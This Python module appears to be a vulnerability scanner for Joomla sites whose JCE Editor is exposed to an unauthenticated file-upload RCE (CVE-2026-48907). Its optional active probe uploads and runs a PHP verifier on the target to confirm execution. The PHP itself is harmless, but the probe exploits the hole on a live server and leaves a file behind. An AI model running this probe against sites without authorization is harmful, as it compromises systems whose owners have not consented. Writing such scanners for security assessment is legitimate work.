#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import random
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.joomla_probe import JCE_PATCHED_VERSION, Joomla


class Module(Scanner, Http_client, Joomla):

    __info__ = {
        "name": "Joomla JCE CVE-2026-48907 (unauthenticated RCE) detection",
        "description": (
            "Detects Joomla sites running JCE Editor < 2.9.99.5 vulnerable to CVE-2026-48907 "
            "(unauthenticated arbitrary file upload leading to RCE). Combines JCE version "
            "fingerprinting with an optional active probe that uploads a harmless PHP math "
            "verifier (no shell)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-48907",
        "references": [
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-48907",
        ],
        "modules": [
            "exploits/http/joomla_jce_cve_2026_48907_rce",
        ],
        "tags": ["web", "scanner", "joomla", "jce", "cve-2026-48907", "rce", "file-upload"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 10,
            "reversible": False,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["joomla", "php"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {"joomla": 0.3, "php": 0.3},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "ssrf_primitive", "from_detail": ""},
                    {"capability": "file_read", "from_detail": "lfi_path"},
                    {"capability": "lfi_param", "from_detail": "lfi_param"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    _PROBE_MARKER = "KS-JCE-48907"
    _RXST_RE = re.compile(r"RXST:([A-Za-z0-9+/=]+):RXEND")

    active_probe = OptBool(
        False,
        "Upload a harmless PHP verifier via JCE to confirm CVE-2026-48907 (leaves a file to delete)",
        required=False,
    )

    def _make_verify_payload(self, expected: int) -> str:
        return (
            f"{self._PROBE_MARKER} probe. Authorized security assessment. Please delete this file!\n"
            "<?php "
            f"echo 'RXST:'.base64_encode('MATHOK:{expected}').':RXEND';"
            " ?>"
        )

    def _check_execution(self, body: str, expected: int) -> bool:
        match = self._RXST_RE.search(body or "")
        if not match:
            return False
        try:
            decoded = base64.b64decode(match.group(1)).decode("utf-8", errors="replace")
        except Exception:
            return False
        return f"MATHOK:{expected}" in decoded

    def _run_active_probe(self, token: str) -> dict:
        factor_a = random.randint(100, 999)
        factor_b = random.randint(100, 999)
        expected = factor_a * factor_b
        payload = self._make_verify_payload(expected)

        uploaded = self.jce_upload_php(token, payload)
        if not uploaded:
            return {
                "status": "SAFE",
                "detail": "Active exploit vectors failed — target may be patched or hardened.",
            }

        verify = self.joomla_http_get(uploaded["path"], timeout=8)
        if not verify or verify.status_code != 200:
            return {
                "status": "VULNERABLE_UPLOAD_ONLY",
                "confidence": "high",
                "detail": (
                    f"File uploaded via {uploaded['vector']} but path not reachable. "
                    f"Manual cleanup may be required: {uploaded['filename']}."
                ),
                "proof_path": uploaded["path"],
                "uploaded_filename": uploaded["filename"],
            }

        body = verify.text or ""
        if self._check_execution(body, expected):
            return {
                "status": "VULNERABLE",
                "confidence": "confirmed",
                "detail": (
                    f"RCE confirmed via {uploaded['vector']} "
                    f"(math check {factor_a}*{factor_b}={expected}). "
                    f"Manual cleanup required: delete {uploaded['filename']}."
                ),
                "proof_path": uploaded["path"],
                "uploaded_filename": uploaded["filename"],
            }

        if body or "<?php" in body:
            return {
                "status": "VULNERABLE_UPLOAD_ONLY",
                "confidence": "high",
                "detail": (
                    f"Arbitrary file uploaded via {uploaded['vector']} but PHP execution blocked. "
                    f"Manual cleanup required: delete {uploaded['filename']}."
                ),
                "proof_path": uploaded["path"],
                "uploaded_filename": uploaded["filename"],
            }

        return {
            "status": "SAFE",
            "detail": "Upload succeeded but verification inconclusive.",
        }

    def run(self):
        try:
            joomla = self.probe_joomla()
            if not joomla.get("found"):
                return False

            jce = self.probe_jce()
            if not jce.get("found"):
                return False

            joomla_version = joomla.get("version")
            jce_version = jce.get("version")

            if jce_version and self.jce_is_patched(jce_version):
                print_status(f"JCE {jce_version} >= {JCE_PATCHED_VERSION} (patched)")
                return False

            if not self.active_probe:
                if jce_version and not self.jce_is_patched(jce_version):
                    self.set_info(
                        severity="critical",
                        cve="CVE-2026-48907",
                        reason=(
                            f"Joomla detected with JCE {jce_version} (< {JCE_PATCHED_VERSION}). "
                            "Enable active_probe to confirm exploitation."
                        ),
                        joomla_version=joomla_version or "unknown",
                        jce_version=jce_version,
                        confidence="high",
                    )
                    return True
                return False

            token = self.fetch_csrf_token()
            if not token:
                self.set_info(
                    severity="medium",
                    cve="CVE-2026-48907",
                    reason=(
                        "JCE appears present but no Joomla CSRF token found — "
                        "may be patched or incompatible with active probe."
                    ),
                    joomla_version=joomla_version or "unknown",
                    jce_version=jce_version or "unknown",
                    confidence="medium",
                )
                return True

            result = self._run_active_probe(token)
            status = result.get("status", "SAFE")
            proof_path = result.get("proof_path")

            if status == "VULNERABLE":
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-48907",
                    reason=result.get("detail", "CVE-2026-48907 confirmed via active probe"),
                    joomla_version=joomla_version or "unknown",
                    jce_version=jce_version or "unknown",
                    confidence=result.get("confidence", "confirmed"),
                    proof_path=proof_path,
                    uploaded_filename=result.get("uploaded_filename"),
                    active_probe=True,
                )
                print_error(result.get("detail", "RCE confirmed — delete uploaded probe file"))
                return True

            if status == "VULNERABLE_UPLOAD_ONLY":
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-48907",
                    reason=result.get("detail", "Unrestricted upload confirmed via JCE"),
                    joomla_version=joomla_version or "unknown",
                    jce_version=jce_version or "unknown",
                    confidence=result.get("confidence", "high"),
                    proof_path=proof_path,
                    uploaded_filename=result.get("uploaded_filename"),
                    active_probe=True,
                )
                print_warning(result.get("detail", "Upload confirmed — delete uploaded probe file"))
                return True

            if jce_version and not self.jce_is_patched(jce_version):
                self.set_info(
                    severity="high",
                    cve="CVE-2026-48907",
                    reason=(
                        f"JCE {jce_version} (< {JCE_PATCHED_VERSION}) but active probe inconclusive. "
                        f"{result.get('detail', '')}"
                    ).strip(),
                    joomla_version=joomla_version or "unknown",
                    jce_version=jce_version,
                    confidence="medium",
                    active_probe=True,
                )
                return True

            return False

        except Exception as exc:
            print_error(f"Scanner failed: {exc}")
            return False
